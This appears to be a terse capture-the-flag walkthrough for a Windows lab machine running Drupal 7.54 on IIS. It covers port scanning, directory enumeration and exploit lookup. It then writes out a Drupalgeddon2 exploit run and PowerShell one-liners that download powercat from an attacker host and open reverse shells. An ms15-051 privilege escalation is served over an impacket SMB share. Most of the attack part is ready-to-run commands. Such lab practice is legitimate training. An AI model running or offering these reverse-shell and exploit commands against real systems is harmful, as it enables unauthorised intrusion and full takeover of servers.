### Ports scan
```text
PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
```

### Port80
```text
# dir enum
http://10.10.10.9:80/misc                 (Status: 301) [Size: 149] [--> http://10.10.10.9:80/misc/]
http://10.10.10.9:80/themes               (Status: 301) [Size: 151] [--> http://10.10.10.9:80/themes/]
http://10.10.10.9:80/install.php          (Status: 200) [Size: 3189]
http://10.10.10.9:80/changelog.txt        (Status: 200) [Size: 110781]
http://10.10.10.9:80/Themes               (Status: 301) [Size: 151] [--> http://10.10.10.9:80/Themes/]
```

```text
# version (from changelog.txt)
Drupal 7.54

# searchspolit
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit) | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC) | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit) | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)  | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)  | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution | php/webapps/46459.py
```

### Exploitation
```bash
./44449.rb $IP

powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.23/powercat.ps1');powercat -c 10.10.14.23 -p 443 -e cmd
```

### Priv Esc
```text
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Architectur:            64-bit

# identify exploit
ms15-051

```

```bash
# fire up smb share
impacket-smbserver smb_share .

# get root shell
\\10.10.14.23\smb_share\ms15-051x64.exe "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.23/powercat.ps1');powercat -c 10.10.14.23 -p 8000 -e cmd"
```
